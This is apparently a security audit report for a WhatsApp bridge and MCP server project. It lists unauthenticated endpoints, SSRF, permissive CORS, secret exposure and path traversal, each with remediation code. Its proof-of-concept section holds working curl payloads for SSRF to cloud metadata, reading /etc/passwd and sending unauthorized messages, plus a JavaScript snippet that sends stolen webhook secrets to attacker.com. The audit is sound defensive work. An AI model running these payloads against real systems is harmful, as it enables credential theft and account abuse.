# WhatsApp MCP Extended - Security Audit Report

**Audit Date:** 2025-12-25
**Scope:** Full codebase (Go bridge, Python MCP server, Docker, dependencies)
**Overall Risk Level:** HIGH
**Status:** Pre-production - Requires remediation before public deployment

---

## Executive Summary

The WhatsApp MCP Extended project has **critical security vulnerabilities** that must be addressed before any internet-accessible deployment. The primary concerns are:

1. No authentication on REST API endpoints
2. SSRF vulnerability in webhook system
3. Overly permissive CORS policy
4. Secret token exposure in API responses
5. Path traversal in media handling

**Current state:** Suitable only for isolated local development.

---

## Risk Matrix

| Severity | Count | Description |
|----------|-------|-------------|
| 🔴 CRITICAL | 5 | Must fix before any deployment |
| 🟠 HIGH | 5 | Should fix before production |
| 🟡 MEDIUM | 6 | Fix for hardened security |
| 🟢 LOW | 3 | Best practice improvements |

---

## Critical Issues (P0)

### 1. No Authentication/Authorization on REST API

**Severity:** 🔴 CRITICAL
**Location:** `whatsapp-bridge/internal/api/server.go`, all handlers
**CVSS Score:** 9.8 (Critical)

**Description:**
All API endpoints are publicly accessible without any authentication. Anyone with network access can:
- Send messages on behalf of the account owner
- Read entire message history
- Create/modify/delete webhooks
- Manage groups (create, add/remove members, promote admins)
- Access contact information
- Delete messages

**Affected Endpoints:**
```go
// ALL 20+ endpoints lack authentication
http.HandleFunc("/api/send", ...)           // Send messages
http.HandleFunc("/api/webhooks", ...)       // Webhook CRUD
http.HandleFunc("/api/group/create", ...)   // Create groups
http.HandleFunc("/api/reaction", ...)       // Send reactions
http.HandleFunc("/api/edit", ...)           // Edit messages
http.HandleFunc("/api/delete", ...)         // Delete messages
http.HandleFunc("/api/read", ...)           // Mark as read
http.HandleFunc("/api/blocklist", ...)      // Block/unblock users
// ... and more
```

**Proof of Concept:**
```bash
# Anyone can send messages without authentication
curl -X POST http://localhost:8180/api/send \
  -H "Content-Type: application/json" \
  -d '{"recipient": "1234567890@s.whatsapp.net", "message": "Unauthorized message"}'
```

**Remediation:**
```go
// Option 1: API Key Authentication (Minimum)
func AuthMiddleware(next http.HandlerFunc) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        apiKey := r.Header.Get("X-API-Key")
        expectedKey := os.Getenv("API_KEY")
        if apiKey == "" || apiKey != expectedKey {
            http.Error(w, "Unauthorized", http.StatusUnauthorized)
            return
        }
        next(w, r)
    }
}

// Option 2: OAuth 2.0 with scoped permissions (Recommended)
// - read:messages, write:messages, manage:webhooks, manage:groups
```

**Priority:** P0 - Must fix before any network exposure

---

### 2. Server-Side Request Forgery (SSRF) in Webhooks

**Severity:** 🔴 CRITICAL
**Location:** `whatsapp-bridge/internal/webhook/validation.go:31-33`, `delivery.go:96`
**CVSS Score:** 9.1 (Critical)

**Description:**
Webhook URLs are only validated to start with `http://` or `https://`. No validation prevents requests to:
- Internal network services
- Cloud metadata endpoints
- Localhost services

**Vulnerable Code:**
```go
// validation.go - Insufficient validation
if !strings.HasPrefix(config.WebhookURL, "http://") &&
   !strings.HasPrefix(config.WebhookURL, "https://") {
    return fmt.Errorf("webhook URL must start with http:// or https://")
}

// delivery.go - Direct request to user-controlled URL
req, err := http.NewRequest("POST", config.WebhookURL, bytes.NewBuffer(payload))
```

**Attack Vectors:**
```bash
# AWS metadata service (steal IAM credentials)
curl -X POST http://localhost:8180/api/webhooks \
  -d '{"webhook_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'

# Internal service scanning
curl -X POST http://localhost:8180/api/webhooks \
  -d '{"webhook_url": "http://192.168.1.1:8080/admin"}'

# Localhost attack
curl -X POST http://localhost:8180/api/webhooks \
  -d '{"webhook_url": "http://127.0.0.1:6379/"}'  # Redis
```

**Remediation:**
```go
import "net"

func isPrivateIP(ip net.IP) bool {
    privateRanges := []string{
        "10.0.0.0/8",
        "172.16.0.0/12",
        "192.168.0.0/16",
        "127.0.0.0/8",
        "169.254.0.0/16",
        "::1/128",
        "fc00::/7",
    }
    for _, cidr := range privateRanges {
        _, block, _ := net.ParseCIDR(cidr)
        if block.Contains(ip) {
            return true
        }
    }
    return false
}

func ValidateWebhookURL(urlStr string) error {
    u, err := url.Parse(urlStr)
    if err != nil {
        return err
    }

    // Resolve hostname
    ips, err := net.LookupIP(u.Hostname())
    if err != nil {
        return err
    }

    for _, ip := range ips {
        if isPrivateIP(ip) {
            return fmt.Errorf("webhook URL resolves to private IP")
        }
    }
    return nil
}
```

**Priority:** P0 - Must fix before any deployment

---

### 3. Unrestricted CORS Policy

**Severity:** 🔴 CRITICAL
**Location:** `whatsapp-bridge/internal/api/middleware.go:9`
**CVSS Score:** 8.1 (High)

**Description:**
CORS is configured to allow requests from ANY origin (`*`), enabling cross-site attacks.

**Vulnerable Code:**
```go
func CorsMiddleware(next http.HandlerFunc) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        w.Header().Set("Access-Control-Allow-Origin", "*")  // DANGEROUS
        w.Header().Set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
        w.Header().Set("Access-Control-Allow-Headers", "Content-Type, Authorization")
        // ...
    }
}
```

**Attack Scenario:**
1. Attacker hosts malicious page at `https://evil.com`
2. Victim visits `evil.com` while running WhatsApp bridge locally
3. JavaScript on `evil.com` makes requests to `http://localhost:8180/api/*`
4. Browser allows requests due to `Access-Control-Allow-Origin: *`
5. Attacker sends messages, reads data from victim's WhatsApp

**Remediation:**
```go
func CorsMiddleware(next http.HandlerFunc) http.HandlerFunc {
    allowedOrigins := map[string]bool{
        "http://localhost:8089": true,  // Webhook UI
        "http://localhost:8082": true,  // Gradio UI
    }

    return func(w http.ResponseWriter, r *http.Request) {
        origin := r.Header.Get("Origin")
        if allowedOrigins[origin] {
            w.Header().Set("Access-Control-Allow-Origin", origin)
        }
        // Don't set header if origin not allowed (browser blocks request)
        // ...
    }
}
```

**Priority:** P0 - Must fix immediately

---

### 4. Webhook Secret Token Exposure

**Severity:** 🔴 CRITICAL
**Location:** `whatsapp-bridge/internal/api/handlers.go:69-101`
**CVSS Score:** 7.5 (High)

**Description:**
The `GET /api/webhooks` endpoint returns webhook configurations including the plaintext `secret_token`, allowing attackers to:
- Forge HMAC signatures
- Bypass webhook authentication
- Impersonate legitimate webhook sources

**Vulnerable Code:**
```go
func (s *Server) handleWebhooks(w http.ResponseWriter, r *http.Request) {
    configs := s.webhookManager.GetWebhookConfigs()
    json.NewEncoder(w).Encode(map[string]interface{}{
        "success": true,
        "data":    configs,  // Contains SecretToken in plaintext!
    })
}
```

**API Response (INSECURE):**
```json
{
  "success": true,
  "data": [{
    "id": 1,
    "name": "My Webhook",
    "webhook_url": "https://example.com/webhook",
    "secret_token": "super_secret_key_123",  // EXPOSED!
    "enabled": true
  }]
}
```

**Remediation:**
```go
type WebhookConfigResponse struct {
    ID         int    `json:"id"`
    Name       string `json:"name"`
    WebhookURL string `json:"webhook_url"`
    HasSecret  bool   `json:"has_secret"`      // Boolean instead of value
    SecretHint string `json:"secret_hint"`     // e.g., "sk_***_3abc"
    Enabled    bool   `json:"enabled"`
}

func maskSecret(secret string) string {
    if len(secret) <= 8 {
        return "****"
    }
    return secret[:4] + "****" + secret[len(secret)-4:]
}
```

**Priority:** P0 - Must fix before any deployment

---

### 5. Path Traversal in Media Handling

**Severity:** 🔴 CRITICAL
**Location:** `whatsapp-bridge/internal/whatsapp/messages.go:52-58`
**CVSS Score:** 7.5 (High)

**Description:**
The `media_path` parameter is read directly without path validation, allowing attackers to read arbitrary files.

**Vulnerable Code:**
```go
func (c *Client) SendMessage(recipient, message, mediaPath string) (*SendResult, error) {
    if mediaPath != "" {
        mediaData, err := os.ReadFile(mediaPath)  // Direct read, no validation!
        // ...
    }
}
```

**Proof of Concept:**
```bash
# Read /etc/passwd
curl -X POST http://localhost:8180/api/send \
  -d '{"recipient": "test@s.whatsapp.net", "media_path": "../../../etc/passwd"}'

# Read WhatsApp session database
curl -X POST http://localhost:8180/api/send \
  -d '{"recipient": "test@s.whatsapp.net", "media_path": "../store/whatsapp.db"}'
```

**Remediation:**
```go
func validateMediaPath(mediaPath string) error {
    // Clean the path
    cleaned := filepath.Clean(mediaPath)

    // Get absolute path
    abs, err := filepath.Abs(cleaned)
    if err != nil {
        return err
    }

    // Ensure it's within allowed directory
    allowedBase := "/app/media"  // Configure appropriately
    if !strings.HasPrefix(abs, allowedBase) {
        return fmt.Errorf("media path outside allowed directory")
    }

    return nil
}
```

**Priority:** P0 - Must fix before any deployment

---

## High Priority Issues (P1)

### 6. No Rate Limiting

**Severity:** 🟠 HIGH
**Location:** All API handlers
**Impact:** DoS, spam, resource exhaustion

**Description:**
No rate limiting on any endpoint. Attackers can:
- Send unlimited WhatsApp messages (spam)
- Flood the API with requests (DoS)
- Exhaust database storage
- Trigger unlimited webhook deliveries

**Remediation:**
```go
import "golang.org/x/time/rate"

var limiter = rate.NewLimiter(rate.Limit(10), 30)  // 10 req/sec, burst 30

func RateLimitMiddleware(next http.HandlerFunc) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        if !limiter.Allow() {
            http.Error(w, "Rate limit exceeded", http.StatusTooManyRequests)
            return
        }
        next(w, r)
    }
}
```

---

### 7. Containers Run as Root

**Severity:** 🟠 HIGH
**Location:** `Dockerfile.bridge`, `Dockerfile.mcp`
**Impact:** Container escape, privilege escalation

**Current State:**
```dockerfile
# No USER directive - runs as root (UID 0)
FROM debian:bullseye-slim AS runtime
```

**Remediation:**
```dockerfile
FROM debian:bullseye-slim AS runtime

# Create non-root user
RUN groupadd -r appuser && useradd -r -g appuser appuser

# ... copy files ...

# Switch to non-root user
USER appuser

CMD ["./whatsapp-bridge"]
```

---

### 8. Sensitive Data in Logs

**Severity:** 🟠 HIGH
**Location:** Multiple files with `fmt.Println`
**Impact:** Information disclosure

**Examples:**
```go
// handlers.go:38 - Logs message content
fmt.Println("Received request to send message", req.Message, req.MediaPath)

// handlers.go:153-156 - Logs trigger values
fmt.Printf("Trigger %d: type=%s, value=%s\n", i, trigger.TriggerType, trigger.TriggerValue)
```

**Remediation:**
- Remove all `fmt.Println` debug statements
- Use structured logging with log levels
- Redact PII and secrets in logs
- Implement log retention policies

---

### 9. Debug Mode Enabled by Default

**Severity:** 🟠 HIGH
**Location:** `docker-compose.yaml:37`
**Impact:** Information disclosure, verbose errors

**Current State:**
```yaml
environment:
  - DEBUG=true  # Should be false in production
```

**Remediation:**
```yaml
environment:
  - DEBUG=${DEBUG:-false}  # Default to false
```

---

### 10. No TLS/HTTPS

**Severity:** 🟠 HIGH
**Location:** `whatsapp-bridge/internal/api/server.go`, `docker-compose.yaml`
**Impact:** Man-in-the-middle attacks, credential theft

**Current State:**
```go
// HTTP only
http.ListenAndServe(serverAddr, nil)
```

**Remediation:**
```go
// Option 1: Direct TLS
http.ListenAndServeTLS(serverAddr, "cert.pem", "key.pem", nil)

// Option 2: Reverse proxy (recommended)
// Use nginx/Traefik with TLS termination
```

---

## Medium Priority Issues (P2)

### 11. Regex Denial of Service (ReDoS)

**Severity:** 🟡 MEDIUM
**Location:** `whatsapp-bridge/internal/webhook/manager.go:146`

User-controlled regex patterns can cause catastrophic backtracking.

```go
// Vulnerable to ReDoS
matched, err := regexp.MatchString(pattern, text)
```

**Remediation:** Use RE2 or add timeout/complexity limits.

---

### 12. Missing Input Validation

**Severity:** 🟡 MEDIUM
**Location:** Throughout API handlers

No validation for:
- Maximum string lengths
- Character allowlisting
- Duplicate detection
- Format validation (JIDs, phone numbers)

---

### 13. SQL Injection (Second-Order Risk)

**Severity:** 🟡 MEDIUM
**Location:** Database operations

All queries use parameterized statements (good), but no input validation could lead to second-order injection if data is used in dynamic queries later.

---

### 14. Webhook Response Information Leakage

**Severity:** 🟡 MEDIUM
**Location:** `webhook/delivery.go:120-124`

Webhook responses stored in logs and returned via API, potential for XSS if displayed.

---

### 15. Hardcoded Timeout Values

**Severity:** 🟡 MEDIUM
**Location:** `delivery.go:31`

```go
Timeout: 30 * time.Second  // Too long, should be configurable
```

---

### 16. Missing Security Headers

**Severity:** 🟡 MEDIUM
**Location:** API responses

Missing headers:
- `X-Content-Type-Options: nosniff`
- `X-Frame-Options: DENY`
- `Content-Security-Policy`
- `Strict-Transport-Security`

---

## Low Priority Issues (P3)

### 17. Predictable Webhook IDs
Auto-increment IDs allow enumeration.

### 18. Base Images Not Pinned
Using tags instead of SHA256 digests.

### 19. No Health Checks
Docker containers lack HEALTHCHECK directive.

---

## Dependency Analysis

### Go Dependencies (go.mod)

| Package | Version | Status |
|---------|---------|--------|
| whatsmeow | v0.0.0-20251203 | ✅ Latest |
| go-sqlite3 | v1.14.32 | ✅ No CVEs |
| golang.org/x/crypto | v0.45.0 | ✅ Current |
| protobuf | v1.36.10 | ✅ Current |

**Action:** Monitor for updates, enable Dependabot.

### Python Dependencies (pyproject.toml)

| Package | Constraint | Risk |
|---------|------------|------|
| httpx | >=0.28.1 | ⚠️ Version range |
| requests | >=2.32.3 | ⚠️ Version range |
| starlette | >=0.37.2 | ⚠️ Version range |

**Action:** Pin exact versions, run `pip-audit`.

---

## Compliance Gaps

### GDPR/Privacy
- ❌ No data retention policies
- ❌ No consent mechanism
- ❌ No data deletion endpoint
- ❌ Messages stored indefinitely

### Security Best Practices
- ❌ No audit logging
- ❌ No secrets management
- ❌ No encryption at rest
- ❌ No key rotation

---

## Remediation Priority

| Priority | Issue | Effort | Timeline |
|----------|-------|--------|----------|
| **P0** | API Authentication | Medium | Week 1 |
| **P0** | SSRF Fix | Low | Week 1 |
| **P0** | CORS Restriction | Low | Week 1 |
| **P0** | Secret Token Redaction | Low | Week 1 |
| **P0** | Path Traversal Fix | Low | Week 1 |
| **P1** | Rate Limiting | Medium | Week 2 |
| **P1** | Non-root Containers | Low | Week 2 |
| **P1** | Remove Debug Logs | Low | Week 2 |
| **P1** | TLS/HTTPS | Medium | Week 2 |
| **P2** | Input Validation | High | Week 3 |
| **P2** | Security Headers | Low | Week 3 |
| **P2** | ReDoS Protection | Medium | Week 3 |

---

## Proof of Concept Exploits

### SSRF to Cloud Metadata
```bash
curl -X POST http://localhost:8180/api/webhooks \
  -H "Content-Type: application/json" \
  -d '{
    "name": "SSRF PoC",
    "webhook_url": "http://169.254.169.254/latest/meta-data/",
    "enabled": true,
    "triggers": [{"trigger_type": "all", "match_type": "exact", "enabled": true}]
  }'
```

### Unauthorized Message Send
```bash
curl -X POST http://localhost:8180/api/send \
  -H "Content-Type: application/json" \
  -d '{"recipient": "victim@s.whatsapp.net", "message": "Sent without auth"}'
```

### Path Traversal
```bash
curl -X POST http://localhost:8180/api/send \
  -H "Content-Type: application/json" \
  -d '{"recipient": "test@s.whatsapp.net", "media_path": "../../../etc/passwd"}'
```

### Cross-Site Attack (CORS)
```html
<!-- On attacker's website -->
<script>
fetch('http://localhost:8180/api/webhooks')
  .then(r => r.json())
  .then(data => {
    // Send stolen webhook secrets to attacker
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  });
</script>
```

---

## Conclusion

**WhatsApp MCP Extended MUST NOT be deployed in any internet-accessible environment** without addressing P0 issues. Current state is suitable only for:
- Isolated local development
- Air-gapped networks
- Single-user testing

**Estimated remediation time:** 40-60 hours for P0/P1 issues.

---

## References

- [OWASP Top 10](https://owasp.org/Top10/)
- [OWASP SSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [CWE-918: SSRF](https://cwe.mitre.org/data/definitions/918.html)
- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
- [Docker Security Best Practices](https://docs.docker.com/develop/security-best-practices/)
